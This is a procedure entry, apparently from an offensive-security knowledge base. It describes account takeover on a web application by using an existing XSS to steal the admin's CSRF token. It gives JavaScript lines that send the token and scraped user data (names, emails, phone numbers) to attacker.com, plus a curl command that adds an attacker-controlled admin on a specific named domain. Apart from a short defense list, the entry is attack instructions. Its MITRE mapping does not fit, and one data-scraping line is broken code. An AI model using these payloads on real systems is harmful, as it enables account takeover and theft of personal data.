---
id: proc-uuid-003
name: Hijack-CSRF-Token-for-Account-Takeover
tags:
  - csrf
  - token-hijack
  - account-takeover
  - xss
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Cloud Instance Metadata API]]'
updated_at: '2025-12-13T23:52:44.280Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Cloud Instance Metadata API]]'
---
# Hijack-CSRF-Token-for-Account-Takeover

## Summary

This procedure uses the executed XSS to extract the CSRF authenticity token from the admin page and leverage it to perform unauthorized actions, such as adding a new admin for account takeover.

## Description

With XSS executing in the admin's browser, the payload can parse the page source or DOM to locate the authenticity_token (often in a meta tag or form hidden field). The token is then exfiltrated to the attacker's server. Using this token, the attacker can forge POST requests from the admin's context to endpoints like admin addition, bypassing CSRF protections and gaining persistent access.

## Requirements

1. XSS already executed in admin session
2. Knowledge of application endpoints (e.g., add admin form action)
3. Attacker server to receive token and issue forged requests

## Defense

Defensive measures and detection strategies:

- Use short-lived CSRF tokens regenerated per request
- Implement same-site cookies (Lax/Strict) to limit cross-origin requests
- Monitor for anomalous POST requests from admin sessions

## Objectives

1. Steal sensitive data visible to admin (names, emails, etc.)
2. Extract and use CSRF token
3. Achieve account takeover

## Instructions

### Step 1: Extract Token via XSS

**Context**: Modify the payload script to locate and send the token.

Update your hosted script to include: `var token = document.querySelector('meta[name="csrf-token"]').content; fetch('https://attacker.com/steal?token=' + token);`

> Trigger re-execution if needed; token sent to attacker server.

### Step 2: Exfiltrate Data

**Context**: While in admin context, grab visible user data.

Extend script: `var data = document.querySelectorAll('.user-info').innerText; fetch('https://attacker.com/exfil?data=' + encodeURIComponent(data));`

> Data includes names, emails, organizations, IDs, mobiles.

### Step 3: Forge Request for Takeover

**Context**: Use stolen token to add admin.

From attacker server, issue POST: e.g., using curl with token.

```bash
curl -X POST https://app.detrack.com/add-admin \
  -H "Cookie: session=admin_session" \
  -d "authenticity_token=STOLEN_TOKEN" \
  -d "new_admin_email=attacker@evil.com"
```

> Expected output: New admin added; login as new admin for takeover.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Cloud Instance Metadata API]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- csrf
- account-takeover
